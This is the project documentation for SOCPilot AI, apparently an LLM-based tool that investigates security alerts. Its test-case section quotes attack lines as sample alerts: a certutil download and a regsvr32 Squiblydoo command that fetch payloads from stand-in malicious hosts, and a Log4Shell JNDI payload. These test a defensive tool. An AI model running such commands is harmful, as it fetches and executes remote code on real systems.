# SOCPilot AI — Complete Project Documentation

This document serves as the master reference for **SOCPilot AI**. It covers everything you need to understand, run, and talk about the project—especially in technical interviews.

---

## 1. What is SOCPilot AI?

**SOCPilot AI** is an AI-powered Security Operations Center (SOC) investigation assistant. Instead of acting like a simple chatbot, it behaves like an autonomous junior SOC analyst. 

When fed a raw security alert (like an email from a SIEM or EDR), it autonomously decides what needs to be investigated, queries external threat intelligence databases, searches through historical incidents, maps attacker behavior to the MITRE ATT&CK framework, and writes a professional SOC report.

---

## 2. Exactly What It Can Do

- **Deterministic IoC Extraction**: Pulls IP addresses, file hashes, CVEs, domains, and suspicious process names from messy text. It uses an LLM for smart extraction, but falls back to regex to ensure it never misses an indicator.
- **Dynamic Tool Calling (Routing)**: The system automatically knows which tools to run based on the data. (e.g. If it sees an IP, it queries AbuseIPDB. If it sees a hash, it queries VirusTotal).
- **Retrieval-Augmented Generation (RAG)**: Retrieves cybersecurity definitions (like what "Pass the Hash" means) using a `MultiQueryRetriever` so the LLM understands complex attacker tactics.
- **Long-Term Memory**: Remembers past alerts. If you feed it an alert today, and a similar one next week, it will recall the first one and point out the overlap.
- **Short-Term Memory**: Remembers context within the same session thread, allowing you to ask follow-up questions.
- **Professional Reporting**: Outputs a beautifully formatted Markdown report and a JSON file containing a calculated Risk Score (0-100), Severity (Low to Critical), and recommended mitigation actions.

---

## 3. How It Is Made (Architecture & Tech Stack)

### Tech Stack
- **Orchestration**: `LangGraph` (for state machine workflows) and `LangChain` (for LLM interactions).
- **LLM**: `Groq` (specifically `llama-3.3-70b-versatile` for blazing-fast inference).
- **Vector Database**: `ChromaDB` (runs locally, no cloud needed).
- **Embeddings**: `HuggingFaceEmbeddings` (`all-MiniLM-L6-v2`) for local, free semantic search.
- **Data Validation**: `Pydantic v2` for strict typing and JSON schema enforcement.

### The LangGraph Workflow
The project is modeled as a state machine where a central `State` dictionary is passed from node to node:
1. **Ingest Node**: Extracts Indicators of Compromise (IoCs).
2. **Parallel Enrichment**: Runs the Memory Node (historical incidents) and RAG Node (cybersecurity docs) simultaneously.
3. **Conditional Router**: A pure Python function checks the IoCs and routes the graph to specific tool nodes.
4. **Tool Nodes**: AbuseIPDB, VirusTotal, NVD NIST (CVEs), MITRE ATT&CK, Sigma Rules.
5. **Reasoning Node**: The LLM looks at *everything* gathered and generates a structured `SOCReport`.
6. **Report Node**: Saves the report to disk (Markdown + JSON) and saves the incident into ChromaDB.

---

## 4. How to Use It (Setup & Configuration)

### Step 1: Install Dependencies
```bash
pip install -r requirements.txt
```

### Step 2: Configure API Keys
Copy `.env.example` to `.env` and fill in the keys.
*   **GROQ_API_KEY** (Required): Get a free key at [console.groq.com](https://console.groq.com).
*   **ABUSEIPDB_API_KEY** (Optional): Get a free key at [abuseipdb.com](https://www.abuseipdb.com/).
*   **VIRUSTOTAL_API_KEY** (Optional): Get a free key at [virustotal.com](https://www.virustotal.com/).
*   *(Note: The system fails gracefully. If you don't provide threat intel keys, it returns mock data so the pipeline still runs).*

### Step 3: Initialize the RAG Database
Run this script once to embed the cybersecurity knowledge base into ChromaDB:
```bash
python setup_rag.py
```

### Step 4: Run an Investigation
Run an alert inline:
```bash
python main.py --alert "Suspicious PowerShell execution on HR-PC-21 by john. Source IP: 185.120.33.8. Command: powershell -enc SQBmAC..."
```
Or run an alert from a text file:
```bash
python main.py --file raw_alert.txt
```

---

## 5. Interview Point of View (Key Talking Points)

If you are asked about this project in an interview, focus on these engineering decisions:

> **"Why did you use LangGraph instead of a standard LangChain Agent?"**
> "Traditional AgentExcecutors (ReAct agents) can get stuck in loops or hallucinate tool calls. LangGraph allows me to define a deterministic state machine. I strictly control the flow—extraction happens first, then parallel enrichment, then conditional routing. This makes the system predictable and production-ready."

> **"How did you handle API failures or missing data?"**
> "I built graceful degradation into the system. If the VirusTotal API times out, the tool node catches the exception, logs it, and passes a structured error back to the state. The Reasoning Node LLM sees the error and adjusts its confidence score downward, rather than crashing the whole pipeline."

> **"What is a MultiQueryRetriever and why use it?"**
> "In cybersecurity, vocabulary mismatch is a huge problem. An alert might say `powershell -enc`, but the documentation might call it `Obfuscated Files or Information`. A standard vector search might miss this. The MultiQueryRetriever asks the LLM to generate 3-4 variations of the query first, searches all of them, and takes the unique union. It drastically improves RAG recall."

> **"How does the memory work?"**
> "It uses a dual-memory architecture. Short-term memory uses LangGraph's `MemorySaver` to checkpoint the state so I can ask follow-up questions in the same thread. Long-term memory uses `ChromaDB` to store completed SOC reports as embeddings, allowing the agent to automatically pull up similar historical incidents on future runs."

---

## 6. Test Cases & Raw Data

Use these raw alert texts to test different paths in the graph.

### Test Case 1: The Phishing Dropper (Tests File Hashes & MITRE)
```text
Alert: EDR detected suspicious file creation.
Host: DESKTOP-X92B
User: admin
File: invoice_overdue.exe
Hash: 44d88612fea8a8f36de82e1278abb02f
Process: certutil.exe -urlcache -split -f http://evil-domain.com/payload.dll
```
*Expected Behavior: Router triggers VirusTotal, Sigma (certutil rule), and MITRE.*

### Test Case 2: The Log4Shell Vulnerability (Tests CVE & IPs)
```text
Alert: WAF detected malicious payload
Source IP: 45.146.164.110
Target: WEB-PROD-01
Payload: GET /login HTTP/1.1
User-Agent: ${jndi:ldap://45.146.164.110:1389/Exploit}
Note: Potential CVE-2021-44228 exploitation attempt.
```
*Expected Behavior: Router triggers CVE Lookup and AbuseIPDB.*

### Test Case 3: The LOLBin / Squiblydoo Attack (Tests complex command line extraction)
```text
Alert Name: Application Whitelisting Bypass Attempt
Time: 2024-05-12T08:33:01Z
Machine: FIN-WORKSTATION-04
Event: Process execution anomalies detected.
Parent: cmd.exe
Child: regsvr32.exe
Command Line: regsvr32.exe /s /n /u /i:http://malicious-server.net/payload.sct scrobj.dll
```
*Expected Behavior: Router triggers MITRE (T1218.010) and Sigma (Squiblydoo rule).*
